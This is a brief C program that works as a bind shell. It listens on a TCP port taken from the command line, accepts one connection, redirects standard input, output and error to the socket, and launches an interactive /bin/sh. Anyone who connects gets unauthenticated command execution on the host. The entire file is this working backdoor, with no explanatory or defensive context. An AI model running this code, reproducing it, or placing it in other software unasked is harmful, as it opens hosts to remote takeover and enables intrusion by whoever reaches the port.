#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int
start_shell (int s)
{
  char *name[3] ;

  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);

  name[0] = "/bin/sh";
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (1);

  return 0;
}

int
server_init (int port)
{
  int                s, s1;
  socklen_t          clen;
  struct sockaddr_in serv, client;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = htonl(INADDR_ANY);

  if ((bind (s, (struct sockaddr *)&serv,
	     sizeof(struct sockaddr_in))) < 0)
    {
      perror ("bind:");
      exit (EXIT_FAILURE);
    }
  if ((listen (s, 10)) < 0)
    {
      perror ("listen:");
      exit (EXIT_FAILURE);
    }
  clen = sizeof(struct sockaddr_in);
  if ((s1 = accept (s, (struct sockaddr *) &client,
		    &clen)) < 0)
    {
      perror ("accept:");
      exit (EXIT_FAILURE);
    }

  return s1;

}

int
main (int argc, char *argv[])
{
  /* FIXME: Check command-line arguments */
  start_shell (server_init (atoi(argv[1])));
  return 0;
}
